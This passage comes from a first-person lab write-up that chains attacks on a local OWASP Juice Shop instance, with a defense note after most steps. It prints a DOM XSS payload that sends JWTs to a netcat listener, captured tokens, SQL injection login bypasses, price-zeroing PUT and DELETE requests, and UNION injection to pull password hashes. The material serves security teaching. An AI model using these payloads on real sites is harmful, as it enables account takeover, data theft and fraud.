- **Underestimated Risk Posture**: The majority of security tools and automated scanners watch bugs in isolation. This adds a false sense of security, since teams will frequently ignore medium and low vulnerabilities that are critical rungs in the exploit ladder. 
- **Increased Remediation Difficulty**: The more complicated a sequence, the harder it is for IT teams to identify each link that's necessary to stop the threat. 
- **Severe Operational Disruption**: A successful chain can lead to massive breaches. This is evident in Capital One's SSRF data theft and Target's vendor credentials to PoS malware incidents. 

### Real-World Examples 
There are a number of real-world examples of threat actors chaining multiple bugs to achieve full system compromise. These include:

1. **Microsoft Exchange "ProxyShell" (2021)**: This is a prime example of a pre-auth chain where the threat actor goes from total stranger to system admin in three simple steps:
- **The Chain**: SSRF -> Privilege Escalation -> RCE
- **Step One (CVE-2021-34473)**: This is an SSRF flaw in the Autodiscover service that facilitates the threat actor talking to the backend PowerShell service without needing to log in. 
- **Step Two (CVE-2021-34523)**: Once the threat actor is communicating with the backend, they exploit a flaw that escalates their privileges to admin. 
- **Step Three (CVE-2021-31207)**: Now that the threat actor has admin rights, they use a security feature bypass to upload a malicious file (web shell) and execute it, giving them full RCE (Remote Code Execution). 
- **Impact**: With this chain, threat actors were able to remotely take over Microsoft Exchange Servers, leading to widespread ransomware deployment, data theft, and the installation of permanent backdoors across thousands of organizations worldwide. 

2. **Cisco Firewall "ArcaneDoor" Chain (2024-2025)**: This is a recent attack that targeted enterprise firewalls and was attributed to nation-state groups. It looked like this: 
- **The Chain**: Broken Access Control -> Buffer Overflow
- **Step One (CVE-2025-20362)**: The threat actor would exploit a missing authorization flaw that gave access to a restricted internal URL endpoint on the firewall without needing to authenticate. 
- **Step Two (CVE-2025-20333)**: Once they had this access to restricted pages, they would trigger a buffer overflow in the VPN web server component. 
- **Impact**: Through this chain, the threat actors were able to execute code as a root user, which allowed them to install persistent malware and monitor encrypted traffic. 

3. **Capital One Cloud Breach (2019)**: The poster-boy for cloud-based vulnerability chains, this shows how a single flaw can compromise a massive data center:
- **The Chain**: SSRF -> IAM Role Abuse -> Data Exfiltration
- **Step One**: The threat actor discovered an SSRF vulnerability in a misconfigured WAF (Web Application Firewall). 
- **Step Two**: Using this flaw, they sent a request to the server's metadata service (an internal cloud tool), which resulted in AWS IAM credentials leaking. 
- **Step Three**: The role whose credentials leaked was an account that was accidentally overprivileged and had access to hundreds of S3 buckets containing customer data. 
- **Impact**: Because of this, the threat actor was able to exfiltrate the PII of more than 100 million customers.

---

## The Attack
### Step 1: Setting up the Capture Listener
I started by setting up a listener to catch the incoming data. I used **Netcat** for this because it's a lightweight way to see raw HTTP requests as they hit my machine.
`netcat -nlvp 4444`

- **-n**: Don't perform DNS lookups (keeps it fast).
- **-l**: Put Netcat into "listen" mode.
- **-v**: Verbose mode so I can see the details of the connection.
- **-p 4444**: Specifies the port I'm opening to wait for the stolen data.

### Step 2: Crafting the XSS Payload
Once the listener was ready, I needed a way to force the victim's browser to send me their session data. I targeted the search bar for a **DOM-based XSS** attack. After testing a few different methods, I went with an <img> tag exploit. 
`<img src="x" onerror="new Image().src='http://127.0.0.1:4444/?token=' + localStorage.getItem('token');">`

I used the `onerror` attribute because it triggers automatically. Since the image source "x" doesn't exist, the browser immediately executes the JavaScript to "fetch" an image from my listener's IP. The clever part here is appending the `localStorage.getItem('token')` to the URL, which grabs their **JWT** and hands it right to me.

### Step 3: URL Encoding for Delivery
To make this work in a real scenario, the script has to be part of a URL. Browsers don't like special characters like brackets or quotes in a web address, so I had to **URL encode** the payload. This turns spaces into %20 and brackets into %3C, making the malicious link look "normal" to the browser's address bar.

`http://localhost:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image().src%3D'http%3A%2F%2F127.0.0.1%3A4444%2F%3Ftoken%3D'%2BlocalStorage.getItem('token')%22%3E`

#### **Defense Note**
This attack exploits DOM-based XSS by taking untrusted input from the URL and writing it directly to the page's Document Object Model without validation. The primary fix is to ensure the application uses Context-Aware Output Encoding. By treating the search query as plain text rather than active HTML, the browser will display the payload instead of executing the onerror script. Additionally, sensitive data like JWTs should be stored in HttpOnly Cookies rather than LocalStorage, which makes them inaccessible to JavaScript and prevents this type of token theft entirely.

### Step 4: Executing the Hijack and Analyzing the Output
I ran a test using my own account to verify the "kill chain" worked. As soon as that URL loaded, my Netcat listener lit up. This confirmed that I'd successfully exfiltrated a **JSON Web Token (JWT)**.
```bash
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34362
GET /?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJoYXlkbmt1dGkuY3NAZ21haWwuY29tIiwicGFzc3dvcmQiOiJmMTMxZjlhOGRmOGM3YTJmYTdiNDc2MDQ4OTk1MzU4MiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTAgMTc6MDk6MjIuODk0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTAgMTc6MDk6MjIuODk0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTg0MDk4MX0.DCRhmhCYm4eODC9MXP9-0J1YXbRv4UuboIcvEZ4ECVmRVhOI-1gDp3XB6VoDG7NMUIkJKzwvHtMlfABUDIDy8Vb3yUUKIOXEnFXREpMXTi5uZGJAeUXqE1jUEJKTXlhb_9iT3kzARDCGY902N7abO4955qirQqK2DQA_eAtOk2A HTTP/1.1
Host: 127.0.0.1:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: http://localhost:3000/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
Priority: u=5, i
```

From a SOC perspective, this is a major red flag. If I'm monitoring this, I'm looking for a GET request containing long, encoded strings in the search parameters, followed by an outbound connection to an unfamiliar IP on a non-standard port like 4444.


### Step 5: Executing the Hijack on the Target
Once I confirmed the link worked, I sent the malicious address to "Jim." As soon as he clicked it, his browser executed my script and sent his **JWT** directly to my listener.
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57488
GET /?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNC0xMSAyMjoxMTowNi44ODcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNC0xMSAyMjoxMTowNi44ODcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzc1OTQ1NTM2fQ.tNQt9bgdZu8gBWUe7CjF9zmqexHE_HPT1HnvWaiNVny-257BMFJdeX52mfbK2qvo7cW8YTxQCEsnwYiK6eTBSDLOrnrDsIT0HsHGvXLH29JnYVNb1pEh9tdLK5ns1wxuqS-wVB97l1xX62MAWCsSPsOyiSqSJAUfAwQLuL7HoTc HTTP/1.1
Host: 127.0.0.1:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: http://localhost:3000/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
Priority: u=5, i


```

This token is like a golden ticket. I don't need Jim's password because the server already trusts this token as proof of his identity.

#### **Defense Note**
This hijack succeeds because of a mix of technical flaws and Social Engineering. On the technical side, storing the JWT in LocalStorage allows JavaScript to steal it; the fix is to use HttpOnly, Secure, and SameSite cookies to hide the token from scripts. However, since the attack started with a clicked link, the organization also needs to prioritize User Awareness Training to help staff spot phishing attempts. Combining these technical lockdowns with a strict Content Security Policy (CSP) ensures that even if a user is tricked into clicking, the browser is blocked from sending sensitive data to an attacker's server.

### Step 6: Session Hijacking with Burp Suite
To use the stolen token, I opened **Burp Suite** and used the built-in browser with the interceptor turned on. I logged into my own low-level account to generate a baseline request, then headed to the **HTTP History** tab to find where the application handles session data. 

I looked for requests to URIs like `/rest/basket/...` and `/rest/user/whoami`. These are critical because they show how the app identifies the current user. I sent the basket request to the **Repeater** so I could start tampering with it.

#### **Defense Note**
This step demonstrates how an attacker can leverage a stolen session identifier to bypass the entire login process. The vulnerability stems from the backend's total reliance on the Bearer Token without verifying if the request context (like the IP address or User-Agent) has changed. To fix this, the server should implement Session Binding, which correlates a session token with specific client attributes. Additionally, the application should use Short-Lived Access Tokens paired with secure Refresh Tokens. This ensures that even if a single token is intercepted via a tool like Burp Suite, its usefulness is extremely limited, forcing the attacker to re-authenticate or lose access almost immediately.

### Step 7: Authorization Bypass via JWT Replacement
In the Repeater, I found the `Authorization: Bearer` header. I deleted my own token and pasted in the one I stole from Jim. When I hit send, the server didn't see me anymore—it saw Jim. I was now successfully authenticated as him without ever knowing his credentials.

### Step 8: Exploiting IDOR for Data Exfiltration
Now that I was acting as Jim, I looked for an **Insecure Direct Object Reference (IDOR)** vulnerability. The URL ended in `.../basket/3`, which suggested that baskets are tracked by simple ID numbers. 

I started changing that number from "3" to other integers. Because the server fails to check if the person requesting the basket actually owns it, I could see private information from across the entire store, including:
* Product IDs in other users' carts
* Total values of private orders
* Quantities and sensitive order details

#### **Defense Note**
This phase demonstrates a total failure of Broken Access Control. The first issue is the lack of Session Validation; the server blindly trusts the JWT without verifying if the request metadata matches the original user. The second, more critical flaw is Insecure Direct Object Reference (IDOR) in the basket lookup. To fix this, the backend must implement Object-Level Authorization that checks if the `UserID` from the session token actually owns the BasketID being requested. Simply being logged in should never be enough to access a resource; the server must verify ownership for every single request to prevent users from lateral movement across the database.

### Step 9: Enumerating the API
I also investigated other leaky URIs I found in the history, like `/rest/admin/application-configuration` and `/rest/user/whoami?field=email`. While these exposed some system details, they didn't provide a direct path to the Big Finale, so I kept digging for a higher level of access.

#### **Defense Note**
From a defensive standpoint, this is a classic **Broken Access Control** failure. The app trusts the JWT for identity but fails to verify if that identity has permission to access specific Object IDs (the baskets).

### Step 10: Targeting the Administrator
Since the URIs I found earlier didn't give me everything I needed, I started guessing common API endpoints. I tried `GET /rest/admin/user-summary`, but it came up empty. However, when I tried `GET /api/Users/1`, I hit the jackpot. 

The server returned an HTTP 200 with the full profile of the user with ID 1. In most applications, the first user created is the administrator, and this was no exception.
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 301
ETag: W/"12d-KWcU8MQ6gvrcoF993WdlMpR4Fhs"
Vary: Accept-Encoding
Date: Sat, 11 Apr 2026 23:21:48 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-04-11T22:11:06.886Z","updatedAt":"2026-04-11T22:11:06.886Z","deletedAt":null}}
```

While I didn't get a password hash, I now had the administrator's email: `admin@juice-sh.op`. This gave me a specific target for my next move.

#### **Defense Note**
This discovery is the result of Predictable Resource Locations and a lack of Administrative Access Control. By simply guessing common API paths and IDs, I was able to bypass the frontend and directly query sensitive administrative data. To fix this, the API should not use predictable, incremental integers for sensitive resources; using UUIDs (Universally Unique Identifiers) makes it significantly harder for an attacker to guess valid endpoints. Furthermore, the backend must strictly enforce Role-Based Access Control (RBAC), ensuring that a standard user session, even a hijacked one, is explicitly denied access to any `/api/Users/` or `/admin/` routes regardless of the ID requested.

### Step 11: Administrative Bypass via SQL Injection (SQLi)
Knowing the admin's email and their position as the first user in the database, I headed back to the login page. Instead of a password, I used a classic **SQL Injection** payload in the email field: `' or 1=1--`. 

This worked instantly, logging me in as the full administrator. To understand why this is so effective, you have to look at how the backend processes that input. A vulnerable query looks something like this:
`SELECT * FROM Users WHERE email = '' OR 1=1 --' AND password = '...'`

### Step 12: Breaking Down the SQLi Payload
There are three reasons why this specific string bypasses the security gate:
* **The Single Quote (`'`):** This "breaks" out of the intended data field, allowing me to start writing my own database commands.
* **The Logic (`OR 1=1`):** Since 1 always equals 1, the database sees this as a "True" statement. It stops caring whether the email or password is correct because the logic for the whole line is now satisfied.
* **The Comment (`--`):** These dashes tell the database to ignore everything that follows them. This effectively deletes the password check from the code as it runs.

Because the database returns the first "True" result it finds, and the Admin is usually the first entry in the table, I was granted full access without needing a password. 

### Step 13: Refined SQLi and Final Admin Takeover
Alternatively, I found that I could be even more specific with my SQL injection. By putting `admin@juice-sh.op'--` into the email field, I could use any random text for the password. This works because the `'` closes the email argument and the `--` tells the database to ignore the password verification logic entirely. It’s a cleaner way to target the specific account I wanted.

#### **Defense Note**
From a blue team perspective, this is a failure of **Input Sanitization**. The application should be using **Parameterized Queries** (also known as Prepared Statements). This treats user input as literal text rather than executable code, which would make the `' or 1=1--` string harmless.

### Step 14: Capturing the Administrative JWT
To ensure I had full, persistent access for my API testing, I used the XSS link I crafted earlier while the Administrator was logged in. My listener caught the Admin’s **JWT** instantly.

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60868
GET /?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTk1MDYzNH0.CxJ9Csv8FhyKlUUto6cT5bbkKaG4-d9MnwA_5uDpvAzaBMQSY8ggPZs19249S1lFcjjQ7I0B7hFhyXMFzYD8IDIn7D0Vkb5LBbuX9cGa1lnQMAyIkCikuGkQwaa9eDDX4-2LRAdeCeXaDW8JwqE8cMsFVkYZR9M19uS0d6oZlmg HTTP/1.1
Host: 127.0.0.1:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: http://localhost:3000/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
Priority: u=5, i
```

With this Golden Token, I can now impersonate the Admin in any web request I send through Burp Suite.

### Step 15: Mapping the Transactional API
While logged in as Admin, I performed a test purchase to see how the application handles checkouts and inventory. Several high-value URIs appeared in my Burp history:
* `/rest/basket/1/checkout`
* `/api/Addresses`
* `/api/Cards`
* `/api/Products/1`

The Product API was the most interesting. While the browser was using a `GET` request just to view the item, I knew that REST APIs often use `PUT` or `PATCH` requests to update that same information.

#### **Defense Note**
This reveals a vulnerability in API Exposure and Improper Asset Management. The backend is exposing sensitive transactional endpoints and administrative methods (like `PUT` and `PATCH`) to the public API without proper restriction. To fix this, the application should implement a Strict HTTP Method Allowlist that rejects any update or delete requests from non-administrative users. Additionally, sensitive internal API documentation and endpoints should be hidden behind a VPN or IP Allowlist, and all transactional logic should be protected by Multi-Factor Authentication (MFA) to ensure that even a hijacked admin session cannot modify critical product or financial data.

### Step 16: Business Logic Abuse (Price Manipulation)
This is the Big Finale of the attack. I took the `GET /api/Products/1` request and sent it to the **Repeater**. I changed the request method from `GET` to `PUT`. Because the backend doesn't properly verify if a user should be allowed to change prices—or even check if the price makes sense—I was able to rewrite the product data in the database.

By sending a JSON body with a new price, I can effectively set the cost of any item in the store to whatever I want, including zero. 

### **Defense Note**
This entire chain proves that securing the front end isn't enough. Even though the "Buy" button might look fine to a regular user, the underlying **API** is vulnerable. To defend against this, I'd recommend implementing **Role-Based Access Control (RBAC)** at the API level and strictly enforcing that only verified inventory management accounts can use the `PUT` or `DELETE` methods on the product catalog.

### Step 17: Analyzing Product Metadata
By sending a `GET` request to `/api/Products/1`, I received the full JSON object for the Apple Juice. This included the current price, description, and internal database IDs. This is the information I needed to build my targeted attack.
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 257
ETag: W/"101-WrAbKAMYdRDfL8O42FJqT+9tQA8"
Vary: Accept-Encoding
Date: Sat, 11 Apr 2026 23:52:00 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-04-11T22:11:12.232Z","updatedAt":"2026-04-11T22:11:12.232Z","deletedAt":null}}
```

### Step 18: Executing Business Logic Abuse (Price Manipulation)
With the metadata in hand, I went back to the **Repeater** and transformed the request. I changed the method to `PUT` and added a JSON body that targeted the price field specifically.
```
PUT /api/Products/1 HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTk1MDYzNH0.CxJ9Csv8FhyKlUUto6cT5bbkKaG4-d9MnwA_5uDpvAzaBMQSY8ggPZs19249S1lFcjjQ7I0B7hFhyXMFzYD8IDIn7D0Vkb5LBbuX9cGa1lnQMAyIkCikuGkQwaa9eDDX4-2LRAdeCeXaDW8JwqE8cMsFVkYZR9M19uS0d6oZlmg
Content-Type: application/json
Content-Length: 17

{"price": 0.00}
```

After doing this, we can see below that the output confirms the new price is set to 0.00:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 254
ETag: W/"fe-vHIu6vcUqjeC+x8l2ubQRAm6ZIY"
Vary: Accept-Encoding
Date: Sat, 11 Apr 2026 23:57:51 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":0,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-04-11T22:11:12.232Z","updatedAt":"2026-04-11T23:56:47.643Z","deletedAt":null}}
```

The server responded with an **HTTP 200 OK**, and the response body confirmed that the price was successfully updated to `0`. This is a critical finding because it proves that the backend doesn't perform "Sanity Checks" on price updates; it blindly trusts whatever the Admin (or someone with a stolen Admin token) tells it to do.

#### **Defense Note**
This exploit is a textbook example of Business Logic Abuse combined with Mass Assignment. The backend trustingly accepts any value provided in the JSON body and updates the database without verifying if the data is logical or if the user has the specific authority to modify financial fields. To fix this, the application should implement Server-Side Validation to ensure prices cannot be set below a certain threshold or changed by a significant percentage without secondary approval. Additionally, the API should use Data Transfer Objects (DTOs) or an allowlist of editable fields to prevent users from binding new values to sensitive database columns like price, even if they have administrative access.

### Step 19: Inventory Destruction (Unauthorized Deletion)
As a final display of impact, I explored the `DELETE` method. By removing the JSON body and changing the request to `DELETE /api/Products/1`, I could effectively wipe items from the store's inventory. 

While deleting items causes a disruption, it's actually less subtle than the price manipulation. If I set everything to $0.00, I can purchase the entire stock for nothing before the business even realizes there's a problem. Deleting the inventory is a louder attack that purely aims to disrupt operations.

#### **Defense Note**
This is a failure of Access Control Enforcement and Improper API Hardening. The API allows the `DELETE` method to be executed on critical resources without verifying if the request is part of a legitimate administrative workflow. To fix this, the backend should implement a strict Method Allowlist at the API gateway level, ensuring that destructive actions like `DELETE` are disabled by default or restricted to a specific, internal management network. Furthermore, the application should utilize Soft Deletes (where a record is marked as inactive rather than physically removed) and require Multi-Factor Authentication (MFA) or dual-authorization (four-eyes principle) for any action that results in the permanent removal of product data.

### Step 20: Privilege Discovery & User Enumeration
I wanted to push the compromise further, so I sent a request to the /api/Users URI. My goal was to exfiltrate a full list of password hashes. While this specific response didn't return the passwords, it did leak a full list of users and their account metadata. 

By analyzing this data, I performed privilege discovery and found several high value targets. This included the CISO's account and multiple users with deluxe roles. This proved that the internal organizational structure was being leaked directly through the API.
```
GET /api/Users HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTk1MDYzNH0.CxJ9Csv8FhyKlUUto6cT5bbkKaG4-d9MnwA_5uDpvAzaBMQSY8ggPZs19249S1lFcjjQ7I0B7hFhyXMFzYD8IDIn7D0Vkb5LBbuX9cGa1lnQMAyIkCikuGkQwaa9eDDX4-2LRAdeCeXaDW8JwqE8cMsFVkYZR9M19uS0d6oZlmg
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
Connection: keep-alive
```

### Step 20: Database Enumeration & Structural Analysis
I wanted to take the exploit a step further to reach a full compromise, so I focused on exfiltrating password hashes from the database. I started by attempting a few basic UNION SQLi commands, but they weren't successful because I didn't know the exact column count. To move forward, I needed to find out the exact structure of the user data, so I repeated the request to analyze the API response.
```
GET /rest/products/search?q=test%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTk1MDYzNH0.CxJ9Csv8FhyKlUUto6cT5bbkKaG4-d9MnwA_5uDpvAzaBMQSY8ggPZs19249S1lFcjjQ7I0B7hFhyXMFzYD8IDIn7D0Vkb5LBbuX9cGa1lnQMAyIkCikuGkQwaa9eDDX4-2LRAdeCeXaDW8JwqE8cMsFVkYZR9M19uS0d6oZlmg
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
Connection: keep-alive
```

This resulted in a clear layout of the JSON structure, which looked like this:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 145
ETag: W/"91-y1NK0HxzvUylW7xAQKvXlduqumQ"
Vary: Accept-Encoding
Date: Sun, 12 Apr 2026 21:47:27 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":[{"id":1,"name":"2","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}
```

#### **Defense Note**
This section illustrates a combination of Sensitive Data Exposure and SQL Injection (SQLi). The first issue is that the API returns entire user objects, including internal IDs and roles, when only minimal data is needed; the fix is to implement Data Filtering to ensure the backend only sends essential fields. The second issue is the successful enumeration of the database structure via the search parameter. To stop this, the application must use Parameterized Queries to prevent input from being executed as SQL. Additionally, the backend should return Generic Error Messages instead of detailed database or structural information, which prevents an attacker from using trial-and-error to map out the system.

### Step 22: Crafting the UNION Injection
Looking at this output, I can see that id maps to the first column, username to the second, and email to the third. Since the latter two are placeholders, I'm able to replace them with the information I actually want to extract. I used this logic to craft a new request that targets specific data from the database:
```
GET /rest/products/search?q=test%27))%20UNION%20SELECT%201,%20email,%20password,%204,%205,%206,%207,%208,%209%20FROM%20Users-- HTTP/1.1
Host: localhost:3000
